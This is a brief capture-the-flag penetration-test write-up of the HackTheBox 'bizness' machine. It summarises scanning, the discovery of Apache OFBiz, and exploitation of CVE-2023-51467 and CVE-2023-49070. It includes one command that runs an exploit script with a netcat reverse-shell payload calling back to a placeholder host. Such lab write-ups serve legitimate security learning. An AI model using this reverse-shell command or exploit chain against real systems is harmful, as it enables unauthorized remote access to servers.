Report:

**Penetration Test Report - HackTheBox: bizness**

1. **Scanning and Enumeration:**
   - Utilized nmap to identify open ports on the target machine.
   - Discovered HTTP and HTTPS services running on the machine.
   - Registered the domain in the hosts file for easier navigation.

2. **Web Application Analysis:**
   - Employed dirb to search for hidden files and directories.
   - Identified the presence of OFBiz Apache on the HTTP server.

3. **Exploitation:**
   - Identified a vulnerability in OFBiz version 18.12.11.
   - Exploited CVE-2023-51467 and CVE-2023-49070 to gain unauthorized access.

4. **Reverse Shell:**
   - Set up a local server and used an exploit to create a reverse shell on the remote server.
   - Executed the following command:
     ```
     python3 exploit.py --url https://bizness.htb:443 --cmd 'nc myip myport -e /bin/sh'
     ```

5. **Shell Access:**
   - Successfully obtained a bash shell through Netcat.
   - Located the user.txt file in the directory /home/bizness.

**Recommendations:**
- Patch and update OFBiz to the latest version to mitigate vulnerabilities.
- Regularly perform security assessments and vulnerability scans.

*Note: This report is for educational purposes and should only be used in compliance with ethical hacking practices.*